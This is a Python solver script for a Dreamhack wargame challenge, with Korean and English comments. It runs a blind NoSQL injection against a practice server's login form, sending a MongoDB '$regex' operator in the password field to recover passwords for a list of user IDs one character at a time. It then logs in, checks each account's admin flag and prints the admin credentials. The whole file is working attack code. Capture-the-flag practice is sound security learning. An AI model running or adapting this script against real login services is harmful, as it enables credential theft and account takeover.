# Wargame site link: https://dreamhack.io/wargame/challenges/1619

import requests
import string
import re

# 서버 정보
HOST = "(VM server link)"
LOGIN = f"{HOST}/login"
USER = f"{HOST}/user"

ID_LIST = ["guest", "hack", "apple", "melon", "testuser", "admin", "aaaa", "cream", "berry", "ice", "panda"]
LETTERS = string.ascii_letters + "{}" + "0123456789"

results = []

for uid in ID_LIST:
    session = requests.Session()
    print(f"\n ID: {uid}")
    password = ""
    found = False  # flag which decides if pw is found

    for i in range(50):  # pw length limit: 50
        found_char = -1  # -1: wrong, 0: correct but incomplete, 1: completely found
        char_found = False  # flag which decides if 'ch' is included in pw

        for ch in LETTERS:
            trial = password + ch
            payload = {
                "uid": uid,
                "upw": {"$regex": f"^{trial}"}
            }

            try:
                # check pw with regex
                res = session.post(LOGIN, json=payload, allow_redirects=False)

                if res.status_code == 302 and res.headers.get("Location") == "/user":
                    # matched → continue guessing
                    password = trial
                    char_found = True
                    print(f"✅ [{uid}] guessing... {password}")
                    break  # found->continue

            except requests.exceptions.RequestException as e:
                print(f"error: {e}")
                continue

        # no 'ch' matched = pw is already found completely.
        if not char_found:
            check_login = session.post(LOGIN, json={"uid": uid, "upw": password}, allow_redirects=False)

            if check_login.status_code == 302:
                user_page = session.get(USER)
                if "<p>Your admin auth:" in user_page.text:
                    match = re.search(r"<p>Your admin auth:\s*(\d)</p>", user_page.text)
                    if match:
                        is_admin = match.group(1) == "1"
                        role = "admin" if is_admin else "user"
                        results.append((uid, password, is_admin))

                        print(f" [{uid}] pw: {password}, class: {role}")
                        break  # if guessing pw fails, we skip and go to next account.

# print admin class users' pw
print("\n\n -> result")
for uid, pw, is_admin in results:
    if is_admin==True:
        print(f"admin clas ID: {uid} / PW: {pw}")

if not results:
    print("no password from accounts found.")
